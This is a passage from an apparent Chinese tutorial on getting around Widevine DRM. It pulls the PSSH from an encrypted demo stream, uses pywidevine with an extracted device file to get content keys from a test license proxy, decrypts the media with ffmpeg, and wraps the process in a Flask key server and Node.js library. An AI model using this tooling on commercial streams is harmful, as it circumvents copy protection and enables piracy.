96);">'./yt-dlp_x86.exe'</span>));<br /><span style="color: rgb(150, 203, 254);">let</span> ytDlpEventEmitter = ytDlpWrap<br />    .<span style="color: rgb(255, 255, 182);">exec</span>([<br />        <span style="color: rgb(168, 255, 96);">'https://cdn.bitmovin.com/content/assets/art-of-motion_drm/mpds/11331.mpd'</span>,<br />        <span style="color: rgb(168, 255, 96);">"-f"</span>,<br />        <span style="color: rgb(168, 255, 96);">"bestvideo[ext=mp4]+bestaudio[ext=m4a]/best[ext=mp4]/best[ext=m4a]"</span>,<br />        <span style="color: rgb(168, 255, 96);">"--allow-u"</span>,<br />        <span style="color: rgb(168, 255, 96);">"--no-part"</span>,<br />        <span style="color: rgb(168, 255, 96);">"--restrict-filenames"</span>,<br />        <span style="color: rgb(168, 255, 96);">"-N 4"</span>,<br />        <span style="color: rgb(168, 255, 96);">'-o'</span>,<br />        <span style="color: rgb(168, 255, 96);">'F:/vmware/output3.mp4'</span>,    ])<br />    .<span style="color: rgb(255, 255, 182);">on</span>(<span style="color: rgb(168, 255, 96);">'progress'</span>, (progress) =&gt;<br />        <span style="color: rgb(198, 197, 254);">console</span>.<span style="color: rgb(255, 255, 182);">log</span>(            progress.percent,            progress.totalSize,            progress.currentSpeed,            progress.eta        )    )<br />    .<span style="color: rgb(255, 255, 182);">on</span>(<span style="color: rgb(168, 255, 96);">'ytDlpEvent'</span>, (eventType, eventData) =&gt;<br />        <span style="color: rgb(198, 197, 254);">console</span>.<span style="color: rgb(255, 255, 182);">log</span>(eventType, eventData)    )<br />    .<span style="color: rgb(255, 255, 182);">on</span>(<span style="color: rgb(168, 255, 96);">'error'</span>, (error) =&gt; <span style="color: rgb(198, 197, 254);">console</span>.<span style="color: rgb(255, 255, 182);">error</span>(error))<br />    .<span style="color: rgb(255, 255, 182);">on</span>(<span style="color: rgb(168, 255, 96);">'close'</span>, () =&gt; <span style="color: rgb(198, 197, 254);">console</span>.<span style="color: rgb(255, 255, 182);">log</span>(<span style="color: rgb(168, 255, 96);">'all done'</span>));<br /><span style="color: rgb(198, 197, 254);">console</span>.<span style="color: rgb(255, 255, 182);">log</span>(ytDlpEventEmitter.ytDlpProcess.pid);</code></pre><p>下载到的mp4无法正常播放<br /><img border="0" class="rich_pages wxw-img" src="https://wechat2rss.xlab.app/img-proxy/?k=998ea079&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJl9l1BVE6U8uVxzjq9IQgOSwZrzlSjBDscwFIiaw5UiaLRBKGbvYCwCQicr81jXDLy7xqI0YfZUUy8w%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="1080" /></p><p><br /><span>接下来抓包看pssh，文件有多个ppsh</span><br /><img border="0" class="rich_pages wxw-img" src="https://wechat2rss.xlab.app/img-proxy/?k=a51e6eb0&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJl9l1BVE6U8uVxzjq9IQgOUzuGgG75MgEjLn2CXdELwHWU2WyIf579O8AnbSRN0UKAibN7hG5b2iaw%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="791" /><br /><span>我们下载的目标文件名是output3.f1_stereo_192000.m4a</span><br /><span>所以搜索192000</span><br /><img border="0" class="rich_pages wxw-img" src="https://wechat2rss.xlab.app/img-proxy/?k=a496a878&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJl9l1BVE6U8uVxzjq9IQgOfPvmmnKuUrMqsDQicrbPJYZtH65Uh7fpg7HR93zf8pHgn3GbicXNXsag%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="946" /><br /><span>密钥为</span><code style="font-family: Consolas, Monaco, ;">AAAAW3Bzc2gAAAAA7e+LqXnWSs6jyCfc1R0h7QAAADsIARIQ62dqu8s0Xpa7z2FmMPGj2hoNd2lkZXZpbmVfdGVzdCIQZmtqM2xqYVNkZmFsa3IzaioCSEQyAA==</code><br /><span>然后在网页抓包找到证书服务器，这个还是比较直观的</span><br /><span>提交和返回都是乱码的就是证书服务器</span><br /><img border="0" class="rich_pages wxw-img" src="https://wechat2rss.xlab.app/img-proxy/?k=83f7f67f&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJl9l1BVE6U8uVxzjq9IQgOAL8uOVn6zyCPx5c77KKFvuKgoMLfttzahElcDedWsFgicE6gOl3rJzQ%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="690" /><br /><img border="0" class="rich_pages wxw-img" src="https://wechat2rss.xlab.app/img-proxy/?k=a8544737&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJl9l1BVE6U8uVxzjq9IQgOHP2OeVjZpoHAKmqia2a5Wz0NtuydCACev7q3mvb2VInDtLZ10XVjmAw%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="1080" /><br /><span>这里我们得到了</span><code style="font-family: Consolas, Monaco, ;">https://cwip-shaka-proxy.appspot.com/no_auth</code><br /><span>所以可以写出代码</span></p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(150, 203, 254);">import</span> json<br /><span style="color: rgb(150, 203, 254);">import</span> re<br /><span style="color: rgb(150, 203, 254);">import</span> requests<br />from pywidevine.cdm <span style="color: rgb(150, 203, 254);">import</span> Cdm<br />from pywidevine.device <span style="color: rgb(150, 203, 254);">import</span> Device<br />from pywidevine.pssh <span style="color: rgb(150, 203, 254);">import</span> PSSHdef get_keys(pssh_value, license_url):<br />    <span style="color: rgb(150, 203, 254);">if</span> pssh_value is None:<br />        <span style="color: rgb(150, 203, 254);">return</span> []    try:<br />        device = Device.load(<span style="color: rgb(168, 255, 96);">"aosp.wvd"</span>)    except:<br />        <span style="color: rgb(150, 203, 254);">return</span> []    pssh_value = PSSH(pssh_value)    cdm = Cdm.from_device(device)    cdm_session_id = cdm.open()    challenge = cdm.get_license_challenge(cdm_session_id, pssh_value)    licence = requests.post(        license_url, data=challenge    )    licence.raise_for_status()    cdm.parse_license(cdm_session_id, licence.content)    keys = []<br />    <span style="color: rgb(150, 203, 254);">for</span> key in cdm.get_keys(cdm_session_id):<br />        <span style="color: rgb(150, 203, 254);">if</span> <span style="color: rgb(168, 255, 96);">"CONTENT"</span> in key.<span style="color: rgb(150, 203, 254);">type</span>:<br />            keys += [f<span style="color: rgb(168, 255, 96);">"{key.kid.hex}:{key.key.hex()}"</span>]    cdm.close(cdm_session_id)<br />    <span style="color: rgb(150, 203, 254);">return</span> keys<br />print(get_keys(<span style="color: rgb(168, 255, 96);">"AAAAW3Bzc2gAAAAA7e+LqXnWSs6jyCfc1R0h7QAAADsIARIQ62dqu8s0Xpa7z2FmMPGj2hoNd2lkZXZpbmVfdGVzdCIQZmtqM2xqYVNkZmFsa3IzaioCSEQyAA=="</span>,<span style="color: rgb(168, 255, 96);">"https://cwip-shaka-proxy.appspot.com/no_auth"</span>))<br /></code></pre><p>请求可以看到返回了许多密钥</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;">['ccbf<span style="color: rgb(255, 115, 253);">5</span>fb<span style="color: rgb(255, 115, 253);">4</span><span style="color: rgb(150, 203, 254);">c</span><span style="color: rgb(255, 115, 253);">2965</span>be<span style="color: rgb(255, 115, 253);">7</span>aa<span style="color: rgb(255, 115, 253);">130</span>ffb<span style="color: rgb(255, 115, 253);">3</span>ba<span style="color: rgb(255, 115, 253);">9</span>fd<span style="color: rgb(255, 115, 253);">73</span>:<span style="color: rgb(255, 115, 253);">9</span><span style="color: rgb(150, 203, 254);">cc</span><span style="color: rgb(255, 115, 253);">0</span><span style="color: rgb(150, 203, 254);">c</span><span style="color: rgb(255, 115, 253);">92044</span>cb<span style="color: rgb(255, 115, 253);">1</span>d<span style="color: rgb(255, 115, 253);">69433</span>f<span style="color: rgb(255, 115, 253);">5</span>f<span style="color: rgb(255, 115, 253);">5839</span>a<span style="color: rgb(255, 115, 253);">159</span>df', '<span style="color: rgb(255, 115, 253);">9</span>bf<span style="color: rgb(255, 115, 253);">0e9</span>cf<span style="color: rgb(255, 115, 253);">0</span>d<span style="color: rgb(255, 115, 253);">7</span>b<span style="color: rgb(255, 115, 253);">55</span>aeb<span style="color: rgb(255, 115, 253);">4</span>b<span style="color: rgb(255, 115, 253);">289</span>a<span style="color: rgb(255, 115, 253);">63</span>bab<span style="color: rgb(255, 115, 253);">8610</span>:<span style="color: rgb(255, 115, 253);">90</span>f<span style="color: rgb(255, 115, 253);">52</span>fd<span style="color: rgb(255, 115, 253);">8</span>ca<span style="color: rgb(255, 115, 253);">48717</span>b<span style="color: rgb(255, 115, 253);">21</span>d<span style="color: rgb(255, 115, 253);">0</span><span style="color: rgb(150, 203, 254);">c</span><span style="color: rgb(255, 115, 253);">2</span>fed<span style="color: rgb(255, 115, 253);">7</span>a<span style="color: rgb(255, 115, 253);">12</span>ae<span style="color: rgb(255, 115, 253);">1</span>', 'eb<span style="color: rgb(255, 115, 253);">676</span>abbcb<span style="color: rgb(255, 115, 253);">345e96</span>bbcf<span style="color: rgb(255, 115, 253);">616630</span>f<span style="color: rgb(255, 115, 253);">1</span>a<span style="color: rgb(255, 115, 253);">3</span>da:<span style="color: rgb(255, 115, 253);">100</span>b<span style="color: rgb(255, 115, 253);">6</span><span style="color: rgb(150, 203, 254);">c</span><span style="color: rgb(255, 115, 253);">20940</span>f<span style="color: rgb(255, 115, 253);">779</span>a<span style="color: rgb(255, 115, 253);">4589152</span>b<span style="color: rgb(255, 115, 253);">57</span>d<span style="color: rgb(255, 115, 253);">2</span>dacb', '<span style="color: rgb(255, 115, 253);">0294</span>b<span style="color: rgb(255, 115, 253);">9599</span>d<span style="color: rgb(255, 115, 253);">755</span>de<span style="color: rgb(255, 115, 253);">2</span>bbf<span style="color: rgb(255, 115, 253);">0</span>fdca<span style="color: rgb(255, 115, 253);">3</span>fa<span style="color: rgb(255, 115, 253);">5</span>eab<span style="color: rgb(255, 115, 253);">7</span>:<span style="color: rgb(255, 115, 253);">3</span>bda<span style="color: rgb(255, 115, 253);">2</span>f<span style="color: rgb(255, 115, 253);">40344</span><span style="color: rgb(150, 203, 254);">c</span><span style="color: rgb(255, 115, 253);">7</span>def<span style="color: rgb(255, 115, 253);">614227</span>b<span style="color: rgb(255, 115, 253);">9</span><span style="color: rgb(150, 203, 254);">c</span><span style="color: rgb(255, 115, 253);">0</span>f<span style="color: rgb(255, 115, 253);">03e26</span>', '<span style="color: rgb(255, 115, 253);">639</span>da<span style="color: rgb(255, 115, 253);">80</span>cf<span style="color: rgb(255, 115, 253);">23</span>b<span style="color: rgb(255, 115, 253);">55</span>f<span style="color: rgb(255, 115, 253);">3</span>b<span style="color: rgb(255, 115, 253);">8</span>cab<span style="color: rgb(255, 115, 253);">3</span>f<span style="color: rgb(255, 115, 253);">64</span>cfa<span style="color: rgb(255, 115, 253);">5</span>df<span style="color: rgb(255, 115, 253);">6</span>:<span style="color: rgb(255, 115, 253);">229</span>f<span style="color: rgb(255, 115, 253);">5</span>f<span style="color: rgb(255, 115, 253);">29</span>b<span style="color: rgb(255, 115, 253);">643e203004</span>b<span style="color: rgb(255, 115, 253);">30</span><span style="color: rgb(150, 203, 254);">c</span><span style="color: rgb(255, 115, 253);">4</span>eaf<span style="color: rgb(255, 115, 253);">348</span>f<span style="color: rgb(255, 115, 253);">4</span>']</code></pre><p>前边是kid，后边是解密的密钥我们返回之前看我们kid是eb676abb-cb34-5e96-bbcf-616630f1a3da<br /><img border="0" class="rich_pages wxw-img" src="https://wechat2rss.xlab.app/img-proxy/?k=62937e83&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJl9l1BVE6U8uVxzjq9IQgOcbqKib3y7EjVzLh7LbSIk8wU7MzKemPcnLYOY1WlEwUWMx1mjNE4MXA%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="1080" /></p><p><br /><span>刚好对应了</span><code style="font-family: Consolas, Monaco, ;">eb676abbcb345e96bbcf616630f1a3da:100b6c20940f779a4589152b57d2dacb</code><br /><span>可以知道我们的密钥是100b6c20940f779a4589152b57d2dacb</span><br /><span>(一个小小的冷知识，其实全怼进去，ffmpeg自己也能识别出来正确的)</span><br /><span>所以输入</span><br /><code style="font-family: Consolas, Monaco, ;">ffmpeg -decryption_key 100b6c20940f779a4589152b57d2dacb -i output3.f1080_4800000.mp4 -codec copy decrypted_media.mp4</code><span>解密视频</span><br /><span>使用同样的密钥</span><br /><code style="font-family: Consolas, Monaco, ;">ffmpeg -decryption_key 100b6c20940f779a4589152b57d2dacb -i output3.f1_stereo_192000.m4a -codec copy decrypted_media.m4a</code><span>解密音频</span><br /><span>输入</span><code style="font-family: Consolas, Monaco, ;">ffmpeg -i decrypted_media.mp4 -i decrypted_media.m4a -vcodec copy -acodec copy video.mp4</code><span>合并视频音频</span><br /><span>我们就得到了一个DRM视频，当然因为版权保护问题无法截图~</span><br /><img border="0" class="rich_pages wxw-img" src="https://wechat2rss.xlab.app/img-proxy/?k=3c03b70a&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJl9l1BVE6U8uVxzjq9IQgOeoORLe9UicXcBIsFic3OjyYWV4gqpTFb9QEG4KfweU1gSSHndoib3BSAA%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto; display: inline;" width="1080" /><span></span></p><p><br /></p><p>之前我们已经实现了python的DRM视频解密但是我是nodejs，因为之前已经写了大量的爬虫代码并且由于js目前没找到cdm的解密库所以干脆考虑自己封一下我决定把之前cdm解密的python代码抽象一下并且引入flask，通过pyinstaller打包成exe然后封装一个nodejs的库唤起，本地服务器如果一定时间没有心跳就自动销毁<br />首先封装一下python的flask代码</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;">from flask <span style="color: rgb(150, 203, 254);">import</span> Flask<br />from flask <span style="color: rgb(150, 203, 254);">import</span> request<br />from flask <span style="color: rgb(150, 203, 254);">import</span> jsonify<br />from threading <span style="color: rgb(150, 203, 254);">import</span> Timer<br />from inspect <span style="color: rgb(150, 203, 254);">import</span> signature<br /><span style="color: rgb(150, 203, 254);">import</span> threading<br />from pywidevine.cdm <span style="color: rgb(150, 203, 254);">import</span> Cdm<br />from pywidevine.device <span style="color: rgb(150, 203, 254);">import</span> Device<br />from pywidevine.pssh <span style="color: rgb(150, 203, 254);">import</span> PSSH<br /><span style="color: rgb(150, 203, 254);">import</span> argparse<br /><span style="color: rgb(150, 203, 254);">import</span> time<br /><span style="color: rgb(150, 203, 254);">import</span> os<br /><span style="color: rgb(150, 203, 254);">import</span> socket<br /><span style="color: rgb(150, 203, 254);">import</span> signal<br /><span style="color: rgb(150, 203, 254);">import</span> requests<br />parser = argparse.ArgumentParser(description=<span style="color: rgb(168, 255, 96);">'command'</span>, formatter_class=argparse.RawTextHelpFormatter)<br />parser.add_argument(<span style="color: rgb(168, 255, 96);">'--autoClose'</span>, <span style="color: rgb(168, 255, 96);">'-c'</span>, help=<span style="color: rgb(168, 255, 96);">'是否自动关闭，默认为300s，设置为0则不自动关闭'</span>,<span style="color: rgb(150, 203, 254);">default</span>=<span style="color: rgb(168, 255, 96);">'300'</span>)<br />parser.add_argument(<span style="color: rgb(168, 255, 96);">'--port'</span>, <span style="color: rgb(168, 255, 96);">'-p'</span>, help=<span style="color: rgb(168, 255, 96);">'设置端口号'</span>)args = parser.parse_args()<br />args.autoClose=<span style="color: rgb(255, 255, 182);">int</span>(args.autoClose)cdmInstance=Noneapp = Flask(__name__)PID = os.getpid()<br />@app.route(<span style="color: rgb(168, 255, 96);">"/ping"</span>,methods=[<span style="color: rgb(168, 255, 96);">"GET"</span>])def ping():<br />    print(<span style="color: rgb(168, 255, 96);">'run ping'</span>)    closeServer()<br />    <span style="color: rgb(150, 203, 254);">return</span> jsonify(status=<span style="color: rgb(168, 255, 96);">"success"</span>)<br />@app.route(<span style="color: rgb(168, 255, 96);">"/close"</span>,methods=[<span style="color: rgb(168, 255, 96);">"GET"</span>])def close():    shutdown()<br />    <span style="color: rgb(150, 203, 254);">return</span> jsonify(status=<span style="color: rgb(168, 255, 96);">"success"</span>)def debounce(wait):    def decorator(fn):        sig = signature(fn)        caller = {}        def debounced(*args, **kwargs):            nonlocal caller            try:                bound_args = sig.bind(*args, **kwargs)                bound_args.apply_defaults()                called_args = fn.__name__ + str(dict(bound_args.arguments))            except:<br />                called_args = <span style="color: rgb(168, 255, 96);">''</span>            t_ = time.time()            def call_it(key):                try:                    # always remove on call                    caller.pop(key)                except:                    pass                fn(*args, **kwargs)            try:                # Always try to cancel timer                caller[called_args].cancel()            except:                pass            caller[called_args] = Timer(wait, call_it, [called_args])            caller[called_args].start()<br />        <span style="color: rgb(150, 203, 254);">return</span> debounced<br />    <span style="color: rgb(150, 203, 254);">return</span> decorator<br />@app.route(<span style="color: rgb(168, 255, 96);">"/loadDevice"</span>,methods=[<span style="color: rgb(168, 255, 96);">"POST"</span>])def loadDevice():    global cdmInstance    form = request.form    device=None<br />    print(form.get(<span style="color: rgb(168, 255, 96);">"path"</span>))    try:<br />        device = Device.load(form.get(<span style="color: rgb(168, 255, 96);">"path"</span>))    except:<br />        <span style="color: rgb(150, 203, 254);">return</span> jsonify(status=<span style="color: rgb(168, 255, 96);">"error"</span>)    cdmInstance = Cdm.from_device(device)<br />    <span style="color: rgb(150, 203, 254);">return</span> jsonify(status=<span style="color: rgb(168, 255, 96);">"success"</span>)<br />@app.route(<span style="color: rgb(168, 255, 96);">"/getKeys"</span>,methods=[<span style="color: rgb(168, 255, 96);">"POST"</span>])def getKeys():    form = request.form<br />    license_url = form.get(<span style="color: rgb(168, 255, 96);">"url"</span>)<br />    headers= form.get(<span style="color: rgb(168, 255, 96);">"headers"</span>)<br />    pssh= form.get(<span style="color: rgb(168, 255, 96);">"pssh"</span>)    pssh_value = PSSH(pssh)    cdm_session_id = cdmInstance.open()    challenge = cdmInstance.get_license_challenge(cdm_session_id, pssh_value)    licence = requests.post(        license_url, data=challenge    )    licence.raise_for_status()    cdmInstance.parse_license(cdm_session_id, licence.content)    keys = []<br />    <span style="color: rgb(150, 203, 254);">for</span> key in cdmInstance.get_keys(cdm_session_id):<br />        <span style="color: rgb(150, 203, 254);">if</span> <span style="color: rgb(168, 255, 96);">"CONTENT"</span> in key.<span style="color: rgb(150, 203, 254);">type</span>:            keys.append({<br />                <span style="color: rgb(168, 255, 96);">"kid"</span>:key.kid.hex,<br />                <span style="color: rgb(168, 255, 96);">"key"</span>:key.key.hex()            })    cdmInstance.close(cdm_session_id)<br />    <span style="color: rgb(150, 203, 254);">return</span> jsonify(status=<span style="color: rgb(168, 255, 96);">"success"</span>,data=keys)def shutdown():<br />    <span style="color: rgb(150, 203, 254);">if</span> args.autoClose==<span style="color: rgb(255, 115, 253);">0</span>:<br />        <span style="color: rgb(150, 203, 254);">return</span><br />    print(<span style="color: rgb(168, 255, 96);">'自动销毁'</span>)<br />    os._exit(<span style="color: rgb(255, 115, 253);">1</span>)@debounce(args.autoClose)def closeServer():    shutdown()@app.errorhandler(Exception)def framework_error(e):    print(e)<br />    <span style="color: rgb(150, 203, 254);">return</span> jsonify(status=<span style="color: rgb(168, 255, 96);">"error"</span>)<br /><span style="color: rgb(150, 203, 254);">if</span> __name__ == <span style="color: rgb(168, 255, 96);">'__main__'</span>:<br />    <span style="color: rgb(150, 203, 254);">if</span> args.port==None:        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br />        sock.bind((<span style="color: rgb(168, 255, 96);">'localhost'</span>, <span style="color: rgb(255, 115, 253);">0</span>))<br />        args.port = sock.getsockname()[<span style="color: rgb(255, 115, 253);">1</span>]        sock.close()    closeServer()<br />    app.run(host=<span style="color: rgb(168, 255, 96);">'0.0.0.0'</span>,port= args.port)<br /></code></pre><p>很简单，然后我们打包成exe，再写一下nodejs的库代码</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(150, 203, 254);">const</span> { default: axios } = require(<span style="color: rgb(168, 255, 96);">"axios"</span>);<br /><span style="color: rgb(150, 203, 254);">const</span> { spawn } = require(<span style="color: rgb(168, 255, 96);">"child_process"</span>);<br /><span style="color: rgb(150, 203, 254);">const</span> net = require(<span style="color: rgb(168, 255, 96);">"net"</span>);<br /><span style="color: rgb(150, 203, 254);">const</span> path = require(<span style="color: rgb(168, 255, 96);">'path'</span>)<br /><span style="color: rgb(150, 203, 254);">const</span> { exec } = require(<span style="color: rgb(168, 255, 96);">'child_process'</span>);<br /><span style="color: rgb(150, 203, 254);">const</span> querystring = require(<span style="color: rgb(168, 255, 96);">'querystring'</span>);<br /><span style="color: rgb(150, 203, 254);">function</span> <span style="color: rgb(255, 255, 182);">sleep</span>(time) {<br />    <span style="color: rgb(150, 203, 254);">return</span> <span style="color: rgb(150, 203, 254);">new</span> <span style="color: rgb(255, 255, 182);">Promise</span>((resolve) =&gt; {        setTimeout(() =&gt; {<br />            <span style="color: rgb(255, 255, 182);">resolve</span>()        }, time)    })}<br />exports.openCDMServer = <span style="color: rgb(150, 203, 254);">async</span> <span style="color: rgb(150, 203, 254);">function</span> <span style="color: rgb(255, 255, 182);">openCDMServer</span>(option) {<br />    <span style="color: rgb(150, 203, 254);">let</span> port = option.port<br />    <span style="color: rgb(150, 203, 254);">const</span> wvdPath = option.wvdFullPath<br />    <span style="color: rgb(150, 203, 254);">if</span> (port === <span style="color: rgb(198, 197, 254);">undefined</span>) {<br />        port = <span style="color: rgb(150, 203, 254);">await</span> <span style="color: rgb(255, 255, 182);">getPortFree</span>()    }<br />    <span style="color: rgb(150, 203, 254);">const</span> portOccupyStatus = <span style="color: rgb(150, 203, 254);">await</span> <span style="color: rgb(255, 255, 182);">checkPortOccupy</span>(port)<br />    <span style="color: rgb(150, 203, 254);">if</span> (!portOccupyStatus) {<br />        <span style="color: rgb(146, 255, 184);">//no use！</span><br />        <span style="color: rgb(255, 255, 182);">exec</span>(path.<span style="color: rgb(255, 255, 182);">join</span>(__filename, <span style="color: rgb(168, 255, 96);">'../cdmServer.exe'</span>)+<span style="color: rgb(168, 255, 96);">' --port '</span>+port, (error, stdout, stderr) =&gt; {<br />            <span style="color: rgb(150, 203, 254);">if</span> (error) {<br />                <span style="color: rgb(198, 197, 254);">console</span>.<span style="color: rgb(255, 255, 182);">error</span>(<span style="color: rgb(168, 255, 96);">`exec error: <span style="color: rgb(218, 239, 163);">${error}</span>`</span>);<br />                <span style="color: rgb(150, 203, 254);">return</span>;            }<br />            <span style="color: rgb(198, 197, 254);">console</span>.<span style="color: rgb(255, 255, 182);">log</span>(<span style="color: rgb(168, 255, 96);">`stdout: <span style="color: rgb(218, 239, 163);">${stdout}</span>`</span>);<br />            <span style="color: rgb(198, 197, 254);">console</span>.<span style="color: rgb(255, 255, 182);">error</span>(<span style="color: rgb(168, 255, 96);">`stderr: <span style="color: rgb(218, 239, 163);">${stderr}</span>`</span>);        });    }<br />    <span style="color: rgb(150, 203, 254);">let</span> serverOpen = <span style="color: rgb(198, 197, 254);">false</span><br />    <span style="color: rgb(150, 203, 254);">const</span> serverAddr = <span style="color: rgb(168, 255, 96);">'http://127.0.0.1:'</span> + port<br />    <span style="color: rgb(150, 203, 254);">for</span> (<span style="color: rgb(150, 203, 254);">let</span> index = <span style="color: rgb(255, 115, 253);">0</span>; index &lt; <span style="color: rgb(255, 115, 253);">60</span>; index++) {<br />        <span style="color: rgb(150, 203, 254);">try</span> {<br />            <span style="color: rgb(150, 203, 254);">const</span> { data } = <span style="color: rgb(150, 203, 254);">await</span> axios.<span style="color: rgb(255, 255, 182);">get</span>(serverAddr + <span style="color: rgb(168, 255, 96);">'/ping'</span>)<br />            <span style="color: rgb(150, 203, 254);">if</span> (data?.status === <span style="color: rgb(168, 255, 96);">'success'</span>) {<br />                serverOpen = <span style="color: rgb(198, 197, 254);">true</span>;<br />                <span style="color: rgb(150, 203, 254);">break</span>;            }<br />        } <span style="color: rgb(150, 203, 254);">catch</span> (error) {<br />            <span style="color: rgb(150, 203, 254);">await</span> <span style="color: rgb(255, 255, 182);">sleep</span>(<span style="color: rgb(255, 115, 253);">1000</span>)<br />            <span style="color: rgb(150, 203, 254);">continue</span>;        }<br />        <span style="color: rgb(150, 203, 254);">await</span> <span style="color: rgb(255, 255, 182);">sleep</span>(<span style="color: rgb(255, 115, 253);">1000</span>)    }<br />    <span style="color: rgb(150, 203, 254);">if</span> (!serverOpen) {<br />        <span style="color: rgb(150, 203, 254);">return</span> {<br />            status: <span style="color: rgb(168, 255, 96);">'error'</span>,<br />            content: <span style="color: rgb(168, 255, 96);">"server open failed!"</span>        }    }<br />    <span style="color: rgb(150, 203, 254);">const</span> timer = setInterval(<span style="color: rgb(150, 203, 254);">async</span> () =&gt; {<br />        <span style="color: rgb(150, 203, 254);">try</span> {<br />            <span style="color: rgb(150, 203, 254);">const</span> { data } = <span style="color: rgb(150, 203, 254);">await</span> axios.<span style="color: rgb(255, 255, 182);">get</span>(serverAddr + <span style="color: rgb(168, 255, 96);">'/ping'</span>)<br />            <span style="color: rgb(150, 203, 254);">if</span> (data?.status === <span style="color: rgb(168, 255, 96);">'success'</span>) {<br />                serverOpen = <span style="color: rgb(198, 197, 254);">true</span>;            }<br />        } <span style="color: rgb(150, 203, 254);">catch</span> (error) {<br />            <span style="color: rgb(198, 197, 254);">console</span>.<span style="color: rgb(255, 255, 182);">log</span>(<span style="color: rgb(168, 255, 96);">'heart:the cdm server is loss'</span>)        }<br />    }, <span style="color: rgb(255, 115, 253);">60</span> * <span style="color: rgb(255, 115, 253);">1000</span>)<br />    <span style="color: rgb(150, 203, 254);">const</span> <span style="color: rgb(255, 255, 182);">closeFunc</span> = () =&gt; {        clearInterval(timer)<br />        axios.<span style="color: rgb(255, 255, 182);">get</span>(serverAddr + <span style="color: rgb(168, 255, 96);">'/close'</span>)    }<br />    <span style="color: rgb(150, 203, 254);">let</span> loadWvdStatus = <span style="color: rgb(198, 197, 254);">false</span><br />    <span style="color: rgb(150, 203, 254);">try</span> {<br />        <span style="color: rgb(150, 203, 254);">const</span> { data } = <span style="color: rgb(150, 203, 254);">await</span> axios.<span style="color: rgb(255, 255, 182);">post</span>(serverAddr + <span style="color: rgb(168, 255, 96);">'/loadDevice'</span>, querystring.<span style="color: rgb(255, 255, 182);">stringify</span>({            path: wvdPath        }))<br />        <span style="color: rgb(150, 203, 254);">if</span> (data?.status === <span style="color: rgb(168, 255, 96);">'success'</span>) {<br />            loadWvdStatus = <span style="color: rgb(198, 197, 254);">true</span>;        }<br />    } <span style="color: rgb(150, 203, 254);">catch</span> (error) {<br />        <span style="color: rgb(198, 197, 254);">console</span>.<span style="color: rgb(255, 255, 182);">log</span>(<span style="color: rgb(168, 255, 96);">'loadWvd Post Error'</span>)    }<br />    <span style="color: rgb(150, 203, 254);">if</span> (!loadWvdStatus) {<br />        <span style="color: rgb(255, 255, 182);">closeFunc</span>()<br />        <span style="color: rgb(150, 203, 254);">return</span> {<br />            content: <span style="color: rgb(168, 255, 96);">"wvd load Error"</span>,<br />            status: <span style="color: rgb(168, 255, 96);">"error"</span>        }    }<br />    <span style="color: rgb(150, 203, 254);">async</span> <span style="color: rgb(150, 203, 254);">function</span> <span style="color: rgb(255, 255, 182);">getKeys</span>(url, pssh, headers) {<br />        <span style="color: rgb(150, 203, 